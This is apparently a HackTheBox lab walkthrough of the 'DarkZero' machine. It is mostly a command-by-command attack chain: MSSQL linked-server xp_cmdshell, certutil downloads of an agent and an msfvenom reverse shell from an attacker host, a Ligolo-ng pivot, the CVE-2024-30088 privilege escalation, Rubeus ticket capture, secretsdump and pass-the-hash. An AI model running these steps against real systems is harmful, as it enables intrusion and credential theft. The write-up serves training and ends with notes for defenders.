# DarkZero - HackTheBox Deep Dive Walkthrough
**Difficulty:** Hard  
**Target IP:** 10.10.11.89  
**Attack Vector:** MSSQL Linked Server Exploitation → Internal Network Pivoting → Kerberos Credential Theft

---

🎯 **Overview**  
DarkZero presents a sophisticated Active Directory environment with two separate domains connected via trust relationships. The attack chain involves exploiting MSSQL linked server misconfigurations, pivoting into an internal network using Ligolo-ng, escalating privileges through a kernel exploit, and finally capturing Kerberos tickets to compromise the domain controller.

**What makes this machine unique?**

- Multihomed architecture with split-horizon DNS  
- Cross-domain trust exploitation  
- Modern pivoting techniques with Ligolo-ng  
- Real-world Kerberos ticket theft scenario

---

## 📡 Phase 1: Reconnaissance - Mapping the Attack Surface

### Initial Port Scan  
Let's start by discovering what services are running:

```bash
nmap -p 1-65535 -T4 -A -v 10.10.11.89
```

🔍 **What are we looking for?**

- Active Directory services (LDAP, Kerberos, DNS)  
- Database services (potential entry points)  
- Remote access services (WinRM, RDP)

**Key Discoveries:**

| Port  | Service     | Why It Matters                                  |
|-------|-------------|--------------------------------------------------|
| 1433  | MS-SQL Server | Entry point for command execution               |
| 88    | Kerberos    | Domain authentication - ticket capture opportunity |
| 389/636 | LDAP/LDAPS | Active Directory queries                         |
| 5985  | WinRM       | Remote shell access (if we get creds)            |
| 445   | SMB         | File sharing, potential relay attacks            |

💡 **Learning Moment:** Notice port 1433 (MSSQL)? This is often overlooked but can be a goldmine. SQL servers frequently have elevated privileges and interesting configurations like linked servers.

---

### DNS Reconnaissance - Discovering the Hidden Network

```bash
dig @10.10.11.89 ANY darkzero.htb
```

🎓 **What just happened?**

The DNS query reveals something fascinating:

- `10.10.11.89` - External interface (what we can reach)  
- `172.16.20.1` - Internal interface (hidden network)

This is called a **multihomed host** — a server with network cards in multiple networks. Think of it like a door between two rooms. We're in the front room, but there's a whole other room behind it!

---

### Preparing the Environment

Add the target to your hosts file for easier access:

```bash
echo "10.10.11.89 DC01.darkzero.htb darkzero.htb" | sudo tee -a /etc/hosts
```

🔑 **Credentials Provided:** `john.w:RFulUtONCOL!`

Let's verify these work:

```bash
crackmapexec smb 10.10.11.89 -u 'john.w' -p 'RFulUtONCOL!' -d darkzero.htb
```

✅ Authentication successful! But only default shares are accessible. We need to dig deeper.

---

## 🗄️ Phase 2: MSSQL Exploitation - The Linked Server Trick

### Connecting to MSSQL

```bash
impacket-mssqlclient 'darkzero.htb/john.w:RFulUtONCOL!@10.10.11.89' -windows-auth
```

🎓 **SQL Server Fundamentals:**

MSSQL authentication has two modes:

- **Windows Authentication:** Uses domain credentials (what we're using)  
- **SQL Authentication:** Uses database-specific usernames/passwords

We're leveraging Windows auth because `john.w` is a domain account.

---

### The Linked Server Discovery

```sql
enum_links
```

🎉 **Jackpot!** We found: `DC02.darkzero.ext`

🤔 **What's a linked server?**  
Imagine you're at Company A's database, and you can run queries on Company B's database without logging in separately. That's a linked server — a configured connection from one SQL instance to another.

**The Security Risk:** If not properly configured, linked servers can provide privilege escalation. The connection might use a more privileged account on the remote server!

---

### Privilege Escalation via Linked Server

First, try to enable command execution on DC01:

```sql
enable_xp_cmdshell
```

❌ **Access Denied!** `john.w` doesn't have enough privileges on DC01.

But watch this magic trick:

```sql
use_link "DC02.darkzero.ext"
enable_xp_cmdshell
```

✅ **Success!**

🎓 **What just happened?**

When we switched to the linked server context:

- Our query now executes on **DC02** instead of DC01  
- The linked server uses the `dc01_sql_svc` account on DC02  
- This service account has higher privileges!

**Visual Flow:**

```
You → john.w → DC01 (limited) → Linked Server → DC02 (dc01_sql_svc = elevated!)
```

Now we can execute commands on DC02's internal network!

---

## 🌉 Phase 3: Network Pivoting with Ligolo-ng - Building the Bridge

🤔 **Why do we need pivoting?**

`DC02` is on the internal network (`172.16.20.0/24`). We can't reach it directly from our Kali machine. We need to create a tunnel through DC01 to access internal resources.

Think of it like this: DC01 is the front door that's unlocked. DC02 is inside the building. We need to run a cable from outside, through DC01, to reach DC02.

---

### Setting Up Ligolo-ng

**Step 1: Download the tools**

```bash
cd ~/hackthebox/darkzero

# Download proxy (for your Kali machine)
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz

# Download agent (for Windows target)
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_0.8.2_windows_amd64.zip

# Extract
tar -xzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
unzip ligolo-ng_agent_0.8.2_windows_amd64.zip
chmod +x proxy
```

**Step 2: Create the tunnel interface**

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

🎓 **What's a TUN interface?**  
TUN (network TUNnel) is a virtual network interface. Think of it as creating a fake network card on your Kali machine that will receive traffic from the internal network through our tunnel.

**Step 3: Start the proxy server**

```bash
sudo ./proxy -selfcert -laddr 0.0.0.0:443
```

The proxy will generate a self-signed certificate and display a fingerprint. Copy this fingerprint! You'll need it soon.

**Example output:**

```
INFO[0000] TLS Certificate fingerprint for ligolo is: 6630035E09EBED79827CF051F792A28F272A0D8134B035177F03468A3A4E5500
```

**Step 4: Host the Windows agent**

In a new terminal:

```bash
python3 -m http.server 8000
```

---

### Uploading the Agent to DC02

Now the clever part — we use our MSSQL access to download the agent!

```sql
xp_cmdshell "certutil -urlcache -split -f http://YOUR_TUN0_IP:8000/agent.exe C:\Users\Public\agent.exe"
```

🎓 **Why certutil?**

`certutil` is a built-in Windows tool originally for certificate management, but it has a hidden feature: downloading files from URLs! We use it because:

- It's already on Windows (no need to install anything)  
- Works through firewalls that might block PowerShell downloads  
- Bypasses some simple security controls

**Verify the upload:**

```sql
xp_cmdshell "dir C:\Users\Public\agent.exe"
```

You should see the file size: `6,694,400 bytes`

---

### Connecting the Agent

Execute the agent with your proxy's IP and fingerprint:

```sql
xp_cmdshell "C:\Users\Public\agent.exe -connect YOUR_TUN0_IP:443 -accept-fingerprint YOUR_FINGERPRINT -ignore-cert"
```

⏱️ The command will timeout — this is normal! The agent is now running in the background on DC02.

---

### Activating the Tunnel

Switch to your ligolo-ng proxy terminal. You should see:

```
INFO[xxxx] Agent joined. id=00155df25c01 name="darkzero-ext\svc_sql@DC02"
```

🎉 The agent connected!

Now configure the tunnel:

```
session # List available sessions
1 # Select session 1
ifconfig # View DC02's network interfaces
```

You'll see DC02 has the IP `172.16.20.2` on the internal network.

Start the tunnel:

```
tunnel_start --tun ligolo
```

---

### Adding the Route

In a new Kali terminal, route traffic destined for the internal network through the tunnel:

```bash
sudo ip route add 172.16.20.0/24 dev ligolo
```

🎓 **What does this do?**  
This tells your Linux kernel: "Any packets going to 172.16.20.0/24? Send them through the 'ligolo' interface instead of your regular network."

**Test connectivity:**

```bash
ping -c 2 172.16.20.2
```

Example output:

```
64 bytes from 172.16.20.2: icmp_seq=1 ttl=64 time=593 ms
64 bytes from 172.16.20.2: icmp_seq=2 ttl=64 time=182 ms
```

🎊 **Success!** You're now communicating with the internal network!

**Visual Representation:**

```
Your Kali (10.10.14.x)
↓
Ligolo Tunnel
↓
DC01 (10.10.11.89) ←→ (172.16.20.1) DC01 Internal
↓
DC02 (172.16.20.2) ← You can now reach this!
```

---

## 💉 Phase 4: Getting a Proper Shell - Meterpreter Deployment

🤔 **Why not just use xp_cmdshell?**

While `xp_cmdshell` works, it's:

- Limited in functionality  
- Timeout-prone for long commands  
- No interactive features  
- Can't upload/download files easily

A **Meterpreter** shell gives us full post-exploitation capabilities!

---

### Generating the Payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_TUN0_IP LPORT=4444 -f exe -o shell.exe
```

🎓 **Payload Breakdown:**

- `windows/x64/meterpreter/reverse_tcp` - A reverse TCP connection (victim connects to us)  
- `LHOST` - Your Kali IP (where to connect back)  
- `LPORT` - Port to connect back on  
- `-f exe` - Output format (Windows executable)

---

### Setting Up the Listener

Start Metasploit:

```bash
msfconsole -q
```

Configure the handler:

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
set ExitOnSession false
exploit -j
```

🎓 **Why `exploit -j`?**  
The `-j` flag runs the handler as a background job. This way, we can continue using `msfconsole` for other tasks while waiting for connections.

---

### Deploying the Payload

Upload via MSSQL:

```sql
xp_cmdshell "certutil -urlcache -split -f http://YOUR_TUN0_IP:8000/shell.exe C:\Users\Public\shell.exe"
```

Execute it:

```sql
xp_cmdshell "C:\Users\Public\shell.exe"
```

Watch your `msfconsole` window:

```
[*] Sending stage (201798 bytes) to 172.16.20.2
[*] Meterpreter session 1 opened (10.10.14.83:4444 -> 172.16.20.2:xxxxx)
```

🎉 **Meterpreter session established!**

---

🎓 **Understanding the Connection:**

```
DC02 (172.16.20.2) → shell.exe executes
↓
Reverse connection starts
↓
Through Ligolo tunnel
↓
Your Kali machine receives (10.10.14.83:4444)
```

Interact with the session:

```
sessions -i 1
getuid
```

Output: `Server username: darkzero-ext\svc_sql`

You're now running as the SQL service account on DC02!

---

## 🔓 Phase 5: Privilege Escalation - Becoming SYSTEM

**Current Status:** `darkzero-ext\svc_sql` (limited user)  
**Goal:** `NT AUTHORITY\SYSTEM` (highest privileges)

---

### Finding the Exploit

Metasploit has an automated exploit suggester:

```
background
use multi/recon/local_exploit_suggester
set session 1
run
```

🎓 **What's happening?**

The suggester:

- Gathers system information (OS version, patch level, architecture)  
- Compares against known exploits in Metasploit's database  
- Recommends exploits likely to work

**Output highlights:**

```
[+] exploit/windows/local/cve_2024_30088_authz_basep: The target appears to be vulnerable.
```

---

### Exploiting CVE-2024-30088

🎓 **Understanding CVE-2024-30088:**  
This is a Windows Kernel Time-of-Check Time-of-Use (TOCTOU) vulnerability. It affects the Windows authorization process:

- **Time-of-Check:** Windows checks if you have permission to do something  
- **Time-of-Use:** Windows actually does that thing

**The Bug:** Between check and use, an attacker can switch permissions  
**Result:** You can execute code as SYSTEM!

Configure the exploit:

```
use exploit/windows/local/cve_2024_30088_authz_basep
set payload windows/x64/meterpreter/reverse_tcp
set session 1
set LHOST tun0
set LPORT 4445
set AutoCheck false
exploit
```

🎓 **Important Details:**

- `LPORT 4445` - Different port than original session to avoid conflicts  
- `AutoCheck false` - Skip auto-verification (we know it's vulnerable)  
- Original session will die - this is expected behavior!

**What to expect:**

```
[*] Started reverse TCP handler on 10.10.14.83:4445
[*] Launching notepad to host the exploit...
[+] Exploit finished, wait for payload execution
[*] Sending stage (201798 bytes) to 172.16.20.2
[*] Meterpreter session 2 opened
```

Verify SYSTEM access:

```
sessions -i 2
getuid
```

```
Server username: NT AUTHORITY\SYSTEM
```

🎊 **You're now SYSTEM!** Full administrative control of DC02!

---

### Capturing the User Flag

```
shell
type C:\Users\Administrator\Desktop\user.txt
exit
```

🎓 **Why can SYSTEM read Administrator's files?**  
`NT AUTHORITY\SYSTEM` is the highest privilege level in Windows — even higher than Administrator! It's the operating system itself. SYSTEM can access anything on the local machine.

---

## 🎫 Phase 6: Kerberos Ticket Theft - The Domain Takeover

🤔 **Why not just use Administrator's hash from DC02?**  
`DC02` is a separate domain (`DARKZERO.EXT`). To compromise DC01 (the main domain `DARKZERO.HTB`), we need DC01's credentials, not DC02's.

**The Strategy:** Force DC01 to authenticate to DC02 while we're SYSTEM on DC02. We'll capture DC01's Kerberos ticket mid-flight!

---

### Understanding Rubeus

🎓 **What is Rubeus?**  
Rubeus is a Kerberos interaction toolkit. In "monitor" mode, it watches for Kerberos traffic and captures tickets as they're issued or used. Think of it as wiretapping the Kerberos authentication protocol.

**How Kerberos Works (Simplified):**

```
1. User/Computer → KDC: "I need access to ServiceX"
2. KDC → User/Computer: "Here's a ticket (TGT)"
3. User/Computer → Service: "Here's my ticket"
4. Service validates ticket and grants access
```

We're going to intercept step 2!

---

### Downloading Rubeus

On Kali:

```bash
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
```

---

### Uploading to DC02

From your SYSTEM meterpreter:

```
cd C:\Users\Public
upload Rubeus.exe
```

Or via PowerShell:

```
shell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://YOUR_TUN0_IP:8000/Rubeus.exe','C:\Users\Public\Rubeus.exe')"
```

---

### Starting the Monitor

From the shell:

```
C:\Users\Public\Rubeus.exe monitor /interval:1 /nowrap
```

🎓 **Parameters Explained:**

- `monitor` - Watch for new Kerberos tickets  
- `/interval:1` - Check every 1 second  
- `/nowrap` - Don't wrap long output (important for base64 tickets!)

Rubeus is now watching...

```
[*] Action: TGT Monitoring
[*] Monitoring every 1 seconds for new TGTs
```

---

### Triggering the Authentication

Open a new terminal and connect to DC01's MSSQL:

```bash
impacket-mssqlclient 'darkzero.htb/john.w:RFulUtONCOL!@DC01.darkzero.htb' -windows-auth
```

Execute the trigger:

```sql
xp_dirtree \\DC02.darkzero.ext\test
```

🎓 **What's happening behind the scenes?**

```
1. DC01's SQL Server tries to access \DC02.darkzero.ext	est
2. DC01 thinks: "I need to authenticate to DC02"
3. DC01 requests a Kerberos ticket from its KDC
4. KDC issues ticket to DC01$'s computer account
5. Rubeus (running as SYSTEM on DC02) intercepts the ticket!
```

---

### The Ticket Capture

Rubeus will display multiple tickets. Look for this specific one:

```
[*] Found new TGT:

User : DC01$@DARKZERO.HTB
StartTime : 10/9/2025 10:21:46 AM
EndTime : 10/9/2025 8:21:46 PM
Flags : name_canonicalize, pre_authent, renewable, forwarded, forwardable
Base64EncodedTicket :

doIFjDCCBYigAwIBBaEDAgEW....[VERY LONG BASE64 STRING]....
```

🎯 **Key Indicators:**

- User: `DC01$@DARKZERO.HTB` (NOT `DARKZERO.EXT`!)  
- Flags include: `forwardable`  

**Copy the entire base64 string!**

🎓 **Why DC01$ specifically?**  
`DC01$` is the computer account for DC01. Computer accounts in AD have special privileges — they can access domain secrets (NTDS.dit). This ticket is our golden ticket to domain admin!

---

## 🔐 Phase 7: Ticket Conversion and Domain Compromise

### Converting the Ticket

On your Kali machine:

```bash
echo "PASTE_ENTIRE_BASE64_STRING_HERE" > dc01_ticket.b64
```

Decode from base64 to Kerberos `.kirbi` format:

```bash
cat dc01_ticket.b64 | base64 -d > dc01_ticket.kirbi
```

Convert to ccache format (Linux-compatible):

```bash
impacket-ticketConverter dc01_ticket.kirbi dc01_admin.ccache
```

🎓 **File Format Journey:**

- `base64` - Text encoding for transmission  
- `.kirbi` - Kerberos ticket (Windows format)  
- `.ccache` - Kerberos credential cache (Linux format)

---

### Using the Ticket

Set the environment variable:

```bash
export KRB5CCNAME=$(pwd)/dc01_admin.ccache
```

🎓 **What's `KRB5CCNAME`?**  
This tells any Kerberos-aware tool: "Use this ticket file for authentication instead of asking for username/password."

---

### Dumping Domain Secrets

Now for the grand finale — extracting all domain credentials:

```bash
impacket-secretsdump -k -no-pass -just-dc -target-ip 10.10.11.89 'darkzero.htb/DC01$@DC01.darkzero.htb'
```

🎓 **Parameter Breakdown:**

- `-k` - Use Kerberos authentication (our captured ticket!)  
- `-no-pass` - Don't prompt for password  
- `-just-dc` - Only dump domain controller secrets (faster)  
- `-target-ip` - Force connection to this IP

**Expected Output:**

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a12c5f3d0f7e8e9b1c2d3e4f5a6b7c8d:::
john.w:1103:aad3b435b51404eeaad3b435b51404ee:RFulUtONCOL!_HASH_HERE:::
```

🎯 **The Prize:** Administrator's NTLM hash: `5917507bdf2ef2c2b<REDACTED>`

---

## 🏆 Phase 8: Administrator Access and Root Flag

### Pass-the-Hash Attack

With the NTLM hash, we can authenticate without knowing the password!

```bash
evil-winrm -i 10.10.11.89 -u administrator -H 5917507bdf2ef2c2b<REDACTED>
```

🎓 **How does Pass-the-Hash work?**

In Windows NTLM authentication:

1. Server sends challenge  
2. Client hashes password and encrypts challenge with the hash  
3. Server verifies the encrypted result

**The Attack:** We already have the hash! We can skip step 2 entirely and just use the hash directly. No plaintext password needed!

Example output:

```
Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

🎊 **You're now Administrator on DC01!**

---

### Retrieving the Root Flag

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

✅ **Machine Pwned!**

---

## 🎓 Key Concepts Summary

1. **Linked Server Exploitation**  
   - SQL servers can be configured to query other SQL servers  
   - Linked connections may use more privileged accounts  
   - Always check linked servers for privilege escalation paths

2. **Network Pivoting with Ligolo-ng**  
   - Modern alternative to SSH tunnels and Metasploit's autoroute  
   - Creates a seamless layer 3 tunnel  
   - Makes internal networks feel local to your attack machine

3. **Kerberos Ticket Theft**  
   - Computer accounts have domain admin-equivalent privileges  
   - Tickets can be captured mid-flight when running as SYSTEM  
   - Forced authentication (xp_dirtree, PrinterBug, etc.) triggers ticket requests

4. **Trust Relationships**  
   - Separate domains can trust each other  
   - Trust allows authentication across domain boundaries  
   - Compromise of one domain can lead to another

5. **Pass-the-Hash**  
   - NTLM hashes are as good as passwords in Windows auth  
   - No need to crack hashes if you can pass them directly  
   - Works for WinRM, SMB, RDP (with restrictions)

---

## 🛠️ Tools Mastery Checklist

- ✅ nmap - Service discovery and version detection  
- ✅ impacket suite - MSSQL client, secretsdump, ticket conversion  
- ✅ Ligolo-ng - Modern network pivoting  
- ✅ Metasploit - Payload generation and privilege escalation  
- ✅ Rubeus - Kerberos ticket monitoring and capture  
- ✅ evil-winrm - Windows Remote Management client  
- ✅ certutil - Abuse built-in Windows tools for file transfer

---

## 🎯 Attack Path Visualization

```
1. john.w credentials
↓
2. MSSQL on DC01 (10.10.11.89)
↓
3. Linked Server to DC02.darkzero.ext
↓
4. xp_cmdshell on DC02 (172.16.20.2)
↓
5. Ligolo-ng tunnel to internal network
↓
6. Meterpreter shell as svc_sql
↓
7. CVE-2024-30088 → SYSTEM on DC02
↓
8. Rubeus captures DC01$ ticket
↓
9. Pass-the-ticket to dump domain secrets
↓
10. Pass-the-hash as Administrator
↓
11. ROOT FLAG! 🎉
```

---

## 💡 Real-World Lessons

**For Penetration Testers:**

- Always enumerate MSSQL linked servers  
- Multihomed hosts are pivot goldmines  
- Computer account tickets are extremely valuable  
- Modern pivoting tools (Ligolo-ng) beat traditional methods

**For Defenders:**

- Audit MSSQL linked server configurations  
- Implement network segmentation  
- Monitor Kerberos ticket requests for anomalies  
- Patch kernel-level vulnerabilities promptly  
- Implement credential guard on DCs
